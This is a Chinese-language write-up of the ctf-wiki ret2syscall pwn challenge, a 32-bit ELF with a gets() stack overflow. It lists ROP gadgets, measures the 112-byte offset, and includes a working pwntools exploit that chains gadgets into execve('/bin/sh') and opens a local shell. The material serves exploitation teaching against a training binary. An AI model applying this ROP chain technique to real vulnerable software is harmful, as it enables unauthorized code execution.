# **基本ROP-ret2syscall（32位ELF）**

> 参考：[ret2syscall-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/iszq8p) 
>
> 下载：[ret2syscall](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall)



**原理**

调用系统函数来getshell，比如调用`execve("/bin/sh",NULL,NULL)`



**利用前提**

存在栈溢出，该程序是32位，所以

- eax应为`0xb`（系统调用号）
- ebx应指向`/bin/sh`的地址
- ecx、edx应为0
- 最后再执行`int 0x80`触发中断即可执行`execve()`获取shell



**检查保护**

开启了NX保护

```shell
$ checksec --file=rop 
[*] '/home/kali/Desktop/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```



**IDA反编译**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(v4);
  return 0;
}
```



**eax**

```shell
# ROPgadget --binary rop --only 'pop|ret' |grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```



**ebx**

```shell
# ROPgadget --binary rop --only 'pop|ret' |grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
```



**ecx**

```shell
# ROPgadget --binary rop --only 'pop|ret' |grep 'ecx'
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```



**edx**

```shell
# ROPgadget --binary rop --only 'pop|ret' |grep 'edx'
0x0806eb69 : pop ebx ; pop edx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0806eb6a : pop edx ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
```



**/bin/sh字符串**

```shell
# ROPgadget --binary rop --string '/bin/sh'          
Strings information
============================================================
0x080be408 : /bin/sh
```



**int 0x80**

```shell
# ROPgadget --binary rop --only 'int'                
Gadgets information
============================================================
0x08049421 : int 0x80
```





**手动测量溢出长度**

`cyclic 200`生成200长度无序字符串，传入栈中判断溢出，先使用**peda-gdb**打开ret2syscall

```shell
$ gdb ret2syscall	# 打开ret2syscall
gdb-peda$ start	# 开始调试，中断在main函数
gdb-peda$ c		# 按c继续执行，接着将200位字符串输入
Invalid $PC address: 0x62616164	# 得到溢出字符，每两位数字转换为10进制，再对应ASCII得到字符为baad
$ cyclic -l 0x62616164	# 得到溢出字符前面位数112
```



**EXP**

```python
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```



保存为`exp.py`，使用Python3执行，成功getshell

```shell
# python 1.py                  
[+] Starting local process './rop': pid 4351
/home/kali/Desktop/1.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload = flat(
[*] Switching to interactive mode
This time, no system() and NO SHELLCODE!!!
What do you plan to do?
$ ls
1.py  peda-session-rop.txt  rop

```

